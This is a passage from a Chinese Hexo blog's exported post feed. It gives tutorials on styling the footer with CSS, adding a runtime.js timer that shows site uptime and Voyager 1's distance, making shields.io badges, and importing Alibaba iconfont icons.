class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* tzy页脚样式 */</span></span><br><span class="line"><span class="selector-id">#ft</span> &#123;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">color</span>: auto;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-1</span>,</span><br><span class="line"><span class="selector-class">.ft-item-2</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">14px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-1</span> &#123;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-top</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-top</span> <span class="selector-class">.t-t-l</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1.4</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-top</span> <span class="selector-class">.t-t-l</span> <span class="selector-class">.bg-ad</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">85%</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn-xz-box</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 按钮背景颜色等 */</span></span><br><span class="line"><span class="selector-class">.btn-xz</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--btn-bg);</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--btn-color);</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">2.4</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">8px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn-xz</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 按钮悬浮颜色 */</span></span><br><span class="line"><span class="selector-class">.btn-xz-box</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-xz</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--text-bg-hover);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-top</span> <span class="selector-class">.t-t-r</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-links</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">14px</span>;</span><br><span class="line">  <span class="attribute">list-style</span>: none;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-links</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 链接悬浮颜色 */</span></span><br><span class="line"><span class="selector-class">.ft-links</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--theme-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> <span class="selector-class">.ft-img-group</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-t</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.1rem</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">600</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.t-l-t</span> &#123;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">14px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> <span class="selector-class">.ft-img-group</span> <span class="selector-class">.img-group-item</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">18.4%</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">14px</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">6px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> <span class="selector-class">.ft-img-group</span> <span class="selector-class">.img-group-item</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ft-item-2</span> <span class="selector-class">.ft-img-group</span> <span class="selector-class">.img-group-item</span> <span class="selector-tag">a</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 头像悬浮颜色框 */</span></span><br><span class="line"><span class="selector-class">.ft-item-2</span> <span class="selector-class">.ft-img-group</span> <span class="selector-class">.img-group-item</span> <span class="selector-tag">a</span> <span class="selector-tag">img</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="built_in">var</span>(--theme-color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line">  <span class="selector-class">.ft-item-1</span> &#123;</span><br><span class="line">    <span class="attribute">flex-basis</span>: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.ft-item-2</span> &#123;</span><br><span class="line">    <span class="attribute">flex-basis</span>: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.t-top</span> <span class="selector-class">.t-t-l</span> <span class="selector-class">.bg-ad</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">576px</span>) &#123;</span><br><span class="line">  <span class="selector-class">.t-top</span> &#123;</span><br><span class="line">    <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.t-top</span> <span class="selector-class">.t-t-l</span> &#123;</span><br><span class="line">    <span class="attribute">flex-basis</span>: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.t-top</span> <span class="selector-class">.t-t-r</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">flex-basis</span>: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#footer-wrap</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#footer-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 页脚心跳动画 */</span></span><br><span class="line"><span class="selector-id">#heartbeat</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">  <span class="attribute">animation</span>: iconAnimate <span class="number">1s</span> ease-in-out infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-moz-keyframes</span> iconAnimate &#123;</span><br><span class="line">  <span class="number">0%</span>,</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">10%</span>,</span><br><span class="line">  <span class="number">30%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">20%</span>,</span><br><span class="line">  <span class="number">40%</span>,</span><br><span class="line">  <span class="number">60%</span>,</span><br><span class="line">  <span class="number">80%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span>,</span><br><span class="line">  <span class="number">70%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> iconAnimate &#123;</span><br><span class="line">  <span class="number">0%</span>,</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">10%</span>,</span><br><span class="line">  <span class="number">30%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">20%</span>,</span><br><span class="line">  <span class="number">40%</span>,</span><br><span class="line">  <span class="number">60%</span>,</span><br><span class="line">  <span class="number">80%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span>,</span><br><span class="line">  <span class="number">70%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-o-keyframes</span> iconAnimate &#123;</span><br><span class="line">  <span class="number">0%</span>,</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">10%</span>,</span><br><span class="line">  <span class="number">30%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">20%</span>,</span><br><span class="line">  <span class="number">40%</span>,</span><br><span class="line">  <span class="number">60%</span>,</span><br><span class="line">  <span class="number">80%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span>,</span><br><span class="line">  <span class="number">70%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> iconAnimate &#123;</span><br><span class="line">  <span class="number">0%</span>,</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">10%</span>,</span><br><span class="line">  <span class="number">30%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">20%</span>,</span><br><span class="line">  <span class="number">40%</span>,</span><br><span class="line">  <span class="number">60%</span>,</span><br><span class="line">  <span class="number">80%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span>,</span><br><span class="line">  <span class="number">70%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>然后计时器还要往<code>#footer-wrap</code>这块元素上面写入网站运行时间等信息，新建文件<code>[BlogRoot]\source\js\runtime.js</code>，写入如下代码。这里要修改的几块东西是：<code>网站诞生时间</code>、<code>currentTimeHtml</code>这块东西；其中<code>currentTimeHtml</code>分为了两种模式，对应两个不同的图标，自行研究一下就懂！</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createtime</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 当前时间</span></span><br><span class="line">    now.<span class="title function_">setTime</span>(now.<span class="title function_">getTime</span>() + <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">var</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;08/01/2022 00:00:00&quot;</span>); <span class="comment">// 旅行者1号开始计算的时间</span></span><br><span class="line">    <span class="keyword">var</span> dis = <span class="title class_">Math</span>.<span class="title function_">trunc</span>(<span class="number">23400000000</span> + ((now - start) / <span class="number">1000</span>) * <span class="number">17</span>); <span class="comment">// 距离=秒数*速度 记住转换毫秒</span></span><br><span class="line">    <span class="keyword">var</span> unit = (dis / <span class="number">149600000</span>).<span class="title function_">toFixed</span>(<span class="number">6</span>);  <span class="comment">// 天文单位</span></span><br><span class="line">    <span class="keyword">var</span> grt = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;04/22/2023 00:00:00&quot;</span>);<span class="comment">// 网站诞生时间 月/日/年 时:分:秒</span></span><br><span class="line">    <span class="keyword">var</span> days = (now - grt) / <span class="number">1e3</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>,</span><br><span class="line">        dnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(days),</span><br><span class="line">        hours = (now - grt) / <span class="number">1e3</span> / <span class="number">60</span> / <span class="number">60</span> - <span class="number">24</span> * dnum,</span><br><span class="line">        hnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(hours);</span><br><span class="line">    <span class="number">1</span> == <span class="title class_">String</span>(hnum).<span class="property">length</span> &amp;&amp; (hnum = <span class="string">&quot;0&quot;</span> + hnum);</span><br><span class="line">    <span class="keyword">var</span> minutes = (now - grt) / <span class="number">1e3</span> / <span class="number">60</span> - <span class="number">1440</span> * dnum - <span class="number">60</span> * hnum,</span><br><span class="line">        mnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(minutes);</span><br><span class="line">    <span class="number">1</span> == <span class="title class_">String</span>(mnum).<span class="property">length</span> &amp;&amp; (mnum = <span class="string">&quot;0&quot;</span> + mnum);</span><br><span class="line">    <span class="keyword">var</span> seconds = (now - grt) / <span class="number">1e3</span> - <span class="number">86400</span> * dnum - <span class="number">3600</span> * hnum - <span class="number">60</span> * mnum,</span><br><span class="line">        snum = <span class="title class_">Math</span>.<span class="title function_">round</span>(seconds);</span><br><span class="line">    <span class="number">1</span> == <span class="title class_">String</span>(snum).<span class="property">length</span> &amp;&amp; (snum = <span class="string">&quot;0&quot;</span> + snum);</span><br><span class="line">    <span class="keyword">let</span> currentTimeHtml = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    (currentTimeHtml =</span><br><span class="line">        hnum &lt; <span class="number">18</span> &amp;&amp; hnum &gt;= <span class="number">9</span></span><br><span class="line">            ? <span class="string">`&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/DQY&amp;WY%E3%81%AE%E5%B0%8F%E7%AA%9D-%E7%A3%95%E7%9D%A1%E7%9D%80%E5%91%A2-ff69b4?logo=westerndigital&amp;style=plastic&#x27; title=&#x27;没事就多陪陪女朋友~&#x27;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt;本站居然运行了 <span class="subst">$&#123;dnum&#125;</span> 天 <span class="subst">$&#123;hnum&#125;</span> 小时 <span class="subst">$&#123;mnum&#125;</span> 分 <span class="subst">$&#123;snum&#125;</span> 秒 &lt;i id=&quot;heartbeat&quot; class=&#x27;fas fa-heartbeat&#x27;&gt;&lt;/i&gt; &lt;br&gt; 旅行者 1 号当前距离地球 <span class="subst">$&#123;dis&#125;</span> 千米，约为 <span class="subst">$&#123;unit&#125;</span> 个天文单位 🚀&lt;/div&gt;`</span></span><br><span class="line">            : <span class="string">`&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/DQY&amp;WY%E3%81%AE%E5%B0%8F%E7%AA%9D-%E7%A3%95%E7%9D%A1%E7%9D%80%E5%91%A2-ff69b4?logo=westerndigital&amp;style=plastic&#x27; title=&#x27;没事儿就多陪陪女朋友~&#x27;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt;本站居然运行了 <span class="subst">$&#123;dnum&#125;</span> 天 <span class="subst">$&#123;hnum&#125;</span> 小时 <span class="subst">$&#123;mnum&#125;</span> 分 <span class="subst">$&#123;snum&#125;</span> 秒 &lt;i id=&quot;heartbeat&quot; class=&#x27;fas fa-heartbeat&#x27;&gt;&lt;/i&gt; &lt;br&gt; 旅行者 1 号当前距离地球 <span class="subst">$&#123;dis&#125;</span> 千米，约为 <span class="subst">$&#123;unit&#125;</span> 个天文单位 🚀&lt;/div&gt;`</span>),</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;workboard&quot;</span>) &amp;&amp;</span><br><span class="line">        (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;workboard&quot;</span>).<span class="property">innerHTML</span> = currentTimeHtml);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置重复执行函数，周期1000ms</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">createtime</span>();</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><ol><li>在主题配置文件<code>_config.butterfly.yml</code>引入该<code>runtime.js</code>文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inject:</span><br><span class="line">  bottom: </span><br><span class="line">+    - &lt;script defer src=&quot;/js/runtime.js&quot;&gt;&lt;/script&gt; # 页脚计时器</span><br></pre></td></tr></table></figure><ol><li>hexo三连</li></ol>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>页脚徽标制作</title>
      <link href="/post/947cbf4b.html"/>
      <url>/post/947cbf4b.html</url>
      
        <content type="html"><![CDATA[<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h3><p><a href="https://shields.io/">徽标在线制作网站</a>(<strong>已经和下面的图片不一样了，但是不用网站也可以实现徽标制作</strong>)</p><details class="folding-tag" ><summary> 原版界面 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/01/p9xhleH.png" alt=""></p>              </div>            </details><h3 id="制作方式"><a href="#制作方式" class="headerlink" title="制作方式"></a>制作方式</h3><p>复制下列<code>url</code>到浏览器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://img.shields.io/badge/Frame-Hexo-blue?logo=Hexo&amp;style=plastic</span><br></pre></td></tr></table></figure><p>你应该会看到这样的徽标：<img src="https://s1.ax1x.com/2023/08/10/pPm4Dwn.png" alt="image-20230810224626773"></p><p>在url进行修改：</p><ol><li><p>改图标(对应图片里面最左边的H)：<a href="https://simpleicons.org/">图标查询</a>，图标名称直接使用simpleicons网站中的名称，填在<code>logo=</code>后面</p></li><li><p>改内容：</p><ul><li><p>Frame-&gt;徽标左侧内容，即<code>Frame</code></p></li><li><p>Hexo-&gt;徽标右侧内容，即<code>Hexo</code></p></li></ul></li><li><p>改颜色：将<code>blue</code>改为原版界面图片中的任意颜色名字即可</p></li></ol><p>得到满意的效果后将<code>url</code>填入<code>img</code>的<code>src</code>中即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img(src=&quot;https://img.shields.io/badge/Frame-Hexo-blue?logo=Hexo&amp;style=plastic&quot; alt=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里图标引入</title>
      <link href="/post/5a7175cd.html"/>
      <url>/post/5a7175cd.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://akilar.top/posts/d2ebecef/">AkilarのIconfont Inject</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/01/p9xWcEn.png" alt=""></p>              </div>            </details><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="新建图标项目"><a href="#新建图标项目" class="headerlink" title="新建图标项目"></a>新建图标项目</h3><ol><li>访问<a href="https://www.iconfont.cn/">阿里巴巴矢量图标库</a>,注册登录。</li><li>搜索自己心仪的图标，然后选择<strong>添加入库</strong>，加到购物车。</li><li>选择完毕后点击右上角的购物车图标，打开侧栏，选择添加到项目，如果没有项目就新建一个。<br><img src="https://npm.elemecdn.com/akilar-candyassets/image/81982c3a.png" alt="img"></li><li>可以通过上方顶栏菜单-&gt;资源管理-&gt;我的项目，找到之前添加的图标项目。<br><img src="https://s1.ax1x.com/2023/06/01/p9xWbU1.png" alt=""></li></ol><h3 id="引入图标"><a href="#引入图标" class="headerlink" title="引入图标"></a>引入图标</h3><ol><li>找到之前新建的图标项目，选择下载至本地，将图标库内容下载下来，然后解压得到下图文件：</li></ol><p><img src="https://s1.ax1x.com/2023/06/01/p9xWHER.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/06/01/p9xfNqJ.png" alt=""></p><ol><li><p>将<code>eot、svg、ttf、woff、woff2</code>后缀的五个文件移至<code>[Blogroot]\themes\butterfly\source\fonts\</code>目录下，没有fonts新建即可</p></li><li><p>在<code>[Blogroot]\themes\butterfly\source\css\custom.css</code>中填写如下内容：</p></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 